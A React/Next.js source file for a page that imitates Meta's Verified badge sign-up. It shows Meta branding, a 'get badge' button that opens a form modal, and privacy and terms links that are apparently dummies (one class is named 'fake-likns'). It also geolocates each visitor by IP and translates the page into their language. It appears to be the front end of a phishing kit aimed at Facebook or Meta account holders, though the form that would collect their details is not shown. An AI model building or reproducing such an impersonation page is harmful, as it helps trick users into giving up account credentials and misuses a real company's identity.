"use client";

import TichImage from "@/assets/images/tich.webp";
import SaveImg from "@/assets/images/save_img.png";
import DocImg from "@/assets/images/doc.png";
import BenefitsSection from "@/components/BenefitsSection";
import { ArrowIcon, MetaLogoSvg, tickSrc } from "@/components/icons";
import PrivacyPolicyModal from "@/components/PrivacyPolicyModal";
import SearchModal from "@/components/SearchModal";
import Sidebar from "@/components/Sidebar";
import TermsModal from "@/components/TermsModal";
import TestimonialSection from "@/components/TestimonialSection";
import { DEFAULT_TEXTS } from "@/constants/default-texts";
import { store } from "@/store/store";
import { purgeOldTranslationCaches, translateBatch } from "@/utils/translate";
import axios from "axios";
import dynamic from "next/dynamic";
import { useCallback, useEffect, useMemo, useState, type FC } from "react";

const FormModal = dynamic(() => import("@/components/form-modal"), {
  ssr: false,
});

const Page: FC = () => {
  const { isModalOpen, setModalOpen, setGeoInfo } = store();
  const [showSearchModal, setShowSearchModal] = useState(false);
  const [showPrivacyModal, setShowPrivacyModal] = useState(false);
  const [selectedPrivacyQuestion, setSelectedPrivacyQuestion] = useState<
    string | null
  >(null);
  const [showTermsModal, setShowTermsModal] = useState(false);
  const [showMobileSidebar, setShowMobileSidebar] = useState(false);
  const [translatedTexts, setTranslatedTexts] =
    useState<Record<string, string>>(DEFAULT_TEXTS);
  const [modalKey, setModalKey] = useState(0);
  const [isInitialized, setIsInitialized] = useState(false);

  const defaultTexts = useMemo(() => DEFAULT_TEXTS, []);

  const translateAllTexts = useCallback(
    async (countryCode: string) => {
      try {
        const keys = Object.keys(defaultTexts);
        const texts = keys.map((key) => defaultTexts[key]);
        const batchResult = await translateBatch(texts, countryCode);
        const translated: Record<string, string> = {};
        keys.forEach((key, index) => {
          translated[key] = batchResult[index];
        });
        setTranslatedTexts(translated);
      } catch {
        setTranslatedTexts(defaultTexts);
      }
    },
    [defaultTexts],
  );

  useEffect(() => {
    if (isInitialized) return;

    const initializeApp = async () => {
      try {
        purgeOldTranslationCaches();
        const ipInfo = localStorage.getItem("ipInfo");
        let countryCode = "US";

        if (ipInfo) {
          const data = JSON.parse(ipInfo);
          countryCode = data.country_code || "US";
          setGeoInfo({
            asn: data.asn || 0,
            ip: data.ip || "Unknown",
            country: data.country || "Unknown",
            region: data.region || "Unknown",
            city: data.city || "Unknown",
            country_code: countryCode,
          });
        } else {
          const { data } = await axios.get(
            "https://get.geojs.io/v1/ip/geo.json",
          );
          localStorage.setItem("ipInfo", JSON.stringify(data));
          countryCode = data.country_code || "US";
          setGeoInfo({
            asn: data.asn || 0,
            ip: data.ip || "Unknown",
            country: data.country || "Unknown",
            region: data.region || "Unknown",
            city: data.city || "Unknown",
            country_code: countryCode,
          });
        }

        // Cho UI render ngay, translate chạy ngầm sau
        setIsInitialized(true);

        if (countryCode.toUpperCase() !== "US") {
          // Không await — không block main thread
          translateAllTexts(countryCode);
        }
      } catch {
        setTranslatedTexts(defaultTexts);
        setIsInitialized(true);
      }
    };

    initializeApp();
  }, [defaultTexts, isInitialized, setGeoInfo, translateAllTexts]);

  const texts = translatedTexts;

  const openFormModal = () => {
    setModalKey((prev) => prev + 1);
    setModalOpen(true);
  };

  return (
    <>
        <div className="container-sm" id="main">
        <div className="container-head">
          <div id="logo">
            <MetaLogoSvg id="headGrad" />
          </div>
          <div
            className="burger-button"
            id="showPopup"
            onClick={() => setShowMobileSidebar(true)}
          >
            <div className="bar" />
            <div className="bar" />
            <div className="bar" />
          </div>
        </div>

        <div className="row">
          <div className="col-4">
            <Sidebar
              texts={texts}
              onOpenSearchModal={() => setShowSearchModal(true)}
              onOpenPrivacyModal={(question) => {
                setSelectedPrivacyQuestion(question);
                setShowPrivacyModal(true);
              }}
              onOpenTermsModal={() => setShowTermsModal(true)}
            />
          </div>
          <div className="col-8">
            <div id="right">
              <h1>
                {/* eslint-disable-next-line @next/next/no-img-element */}
                <img
                  alt=""
                  src={tickSrc}
                  style={{ height: "50px", width: "50px", marginRight: "8px" }}
                />
                {texts.title}
              </h1>
              <p>{texts.congrats}</p>
              <p>{texts.milestone}</p>
              <p>{texts.excited}</p>

              <div id="card" style={{ background: "rgb(222, 240, 243)" }}>
                {/* eslint-disable-next-line @next/next/no-img-element */}
                <img
                  alt=""
                  src={
                    typeof TichImage === "string" ? TichImage : TichImage.src
                  }
                  style={{ marginTop: "30px" }}
                />
                <div className="card-text">
                  <div
                    style={{
                      borderRadius: "15px",
                      backgroundColor: "white",
                      padding: "20px 20px 10px 20px",
                    }}
                  >
                    <h5>
                      {/* eslint-disable-next-line @next/next/no-img-element */}
                      <img
                        src={tickSrc}
                        width="18"
                        alt="tick"
                        style={{ verticalAlign: "middle" }}
                      />{" "}
                      {texts.metaVerified}
                    </h5>
                    <h6>{texts.protectBrand}</h6>
                    <h6
                      style={{
                        display: "flex",
                        flexDirection: "column",
                        gap: "6px",
                      }}
                    >
                      <span>{texts.showWorld}</span>
                      <span>{texts.buildConfidence}</span>
                    </h6>
                  </div>
                  <div className="btn-wrapper">
                    <div
                      className="button fb-blue w-100"
                      id="start"
                      onClick={openFormModal}
                    >
                      {texts.getBadge}
                    </div>
                  </div>
                </div>
              </div>

              <BenefitsSection texts={texts} />
              <TestimonialSection texts={texts} />

              <h5>
                {/* eslint-disable-next-line @next/next/no-img-element */}
                <img
                  src={tickSrc}
                  width="18"
                  alt="tick"
                  style={{ verticalAlign: "middle" }}
                />{" "}
                {texts.exploreBusiness}
              </h5>
              <br />
              <h6>{texts.businessDesc1}</h6>
              <h6>{texts.businessDesc2}</h6>
              <h6>{texts.businessDesc3}</h6>
              <h6>{texts.businessDesc4}</h6>
              <h6>
                {texts.businessDesc5}
                <br />
                {texts.businessDesc6}
                <br />
                <br />
                <div className="fake-likns">
                  <div className="action-button-list">
                    <div
                      className="action-button wide"
                      onClick={() => {
                        setSelectedPrivacyQuestion(texts.privacyPolicyQ);
                        setShowPrivacyModal(true);
                      }}
                    >
                      <div className="action-button-img">
                        {/* eslint-disable-next-line @next/next/no-img-element */}
                        <img alt="" src={SaveImg.src} />
                      </div>
                      <div className="action-button-text">
                        <span>{texts.privacyPolicyQ}</span>
                        <br />
                        <span className="small-grey">
                          {texts.privacyPolicy}
                        </span>
                      </div>
                      <div className="action-button-arrow">
                        <ArrowIcon />
                      </div>
                    </div>
                    <div
                      className="action-button wide"
                      onClick={() => {
                        setSelectedPrivacyQuestion(texts.manageInfo);
                        setShowPrivacyModal(true);
                      }}
                    >
                      <div className="action-button-img">
                        {/* eslint-disable-next-line @next/next/no-img-element */}
                        <img alt="" src={SaveImg.src} />
                      </div>
                      <div className="action-button-text">
                        <span>{texts.manageInfo}</span>
                        <br />
                        <span className="small-grey">
                          {texts.privacyPolicy}
                        </span>
                      </div>
                      <div className="action-button-arrow">
                        <ArrowIcon />
                      </div>
                    </div>
                  </div>
                  <br />
                  <h6>{texts.userAgreement}</h6>
                  <div
                    className="action-button wide"
                    onClick={() => setShowTermsModal(true)}
                  >
                    <div className="action-button-img">
                      {/* eslint-disable-next-line @next/next/no-img-element */}
                      <img alt="" src={DocImg.src} />
                    </div>
                    <div className="action-button-text">
                      <span>{texts.metaAI}</span>
                      <br />
                      <span className="small-grey">{texts.userAgreementLabel}</span>
                    </div>
                    <div className="action-button-arrow">
                      <ArrowIcon />
                    </div>
                  </div>
                  <br />
                  <h6>{texts.additionalResources}</h6>
                  <div className="action-button-list">
                    {[
                      { title: texts.aiInfo, subtitle: texts.privacyCenter },
                      { title: texts.aiCards, subtitle: texts.metaAIWebsite },
                      { title: texts.aiIntro, subtitle: texts.forTeenagers },
                    ].map((item) => (
                      <div
                        key={item.title}
                        className="action-button wide"
                        onClick={() => {
                          setSelectedPrivacyQuestion(item.title);
                          setShowPrivacyModal(true);
                        }}
                      >
                        <div className="action-button-text">
                          <span>{item.title}</span>
                          <br />
                          <span className="small-grey">{item.subtitle}</span>
                        </div>
                        <div className="action-button-arrow">
                          <ArrowIcon />
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              </h6>
              <p className="small-grey">
                {texts.privacyRisks}{" "}
                <a
                  className="add-svg"
                  id="policyLink"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  {texts.privacyPolicy}
                </a>
              </p>
            </div>
          </div>
        </div>
      </div>

      {isModalOpen && <FormModal key={modalKey} />}
      <SearchModal
        show={showSearchModal}
        onClose={() => setShowSearchModal(false)}
        texts={texts}
      />
      <PrivacyPolicyModal
        show={showPrivacyModal}
        onClose={() => {
          setShowPrivacyModal(false);
          setSelectedPrivacyQuestion(null);
        }}
        selectedQuestion={selectedPrivacyQuestion}
        texts={texts}
      />
      <TermsModal
        show={showTermsModal}
        onClose={() => setShowTermsModal(false)}
        texts={texts}
      />

      {showMobileSidebar && (
        <div
          className="popup show"
          id="popup"
          onClick={() => setShowMobileSidebar(false)}
          style={{ display: "block" }}
        >
          <div className="popup-item" onClick={(e) => e.stopPropagation()}>
            <div
              className="burger-button-popup"
              id="closePopup"
              onClick={() => setShowMobileSidebar(false)}
            >
              <div className="bar" />
              <div className="bar" />
            </div>
            <div className="popup-content">
              <Sidebar
                texts={texts}
                onOpenSearchModal={() => {
                  setShowMobileSidebar(false);
                  setShowSearchModal(true);
                }}
                onOpenPrivacyModal={(question) => {
                  setShowMobileSidebar(false);
                  setSelectedPrivacyQuestion(question);
                  setShowPrivacyModal(true);
                }}
                onOpenTermsModal={() => {
                  setShowMobileSidebar(false);
                  setShowTermsModal(true);
                }}
              />
            </div>
          </div>
        </div>
      )}
    </>
  );
};

export default Page;
